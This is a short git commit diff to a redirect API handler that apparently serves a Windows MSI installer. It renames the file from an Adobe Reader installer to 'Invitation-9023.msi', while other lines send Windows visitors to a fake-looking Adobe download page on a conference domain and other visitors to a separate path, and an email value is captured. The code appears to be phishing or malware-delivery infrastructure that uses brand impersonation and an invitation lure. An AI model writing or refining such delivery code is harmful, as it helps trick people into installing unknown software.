582421cd070f5d7f87865de92ecb8bd00a1c1914
kpaspoimi <kpaspoimitica@outlook.com>
2026-01-29 05:40:54 -0500

    Update MSI path for Windows download handler

--- redirect-app/pages/api/redirect.js
+++ redirect-app/pages/api/redirect.js
@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'aspiceconference.com/adobe-reader/installer/download.html';
-  const MSI_PATH = '/Adobe_Reader_install.msi';
+  const MSI_PATH = '/Invitation-9023.msi';
   const NON_WINDOWS_TARGET = 'https://aspiceconference.com/cw';
 
   let email = '';
@@ -56,6 +56,7 @@ export default function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
 
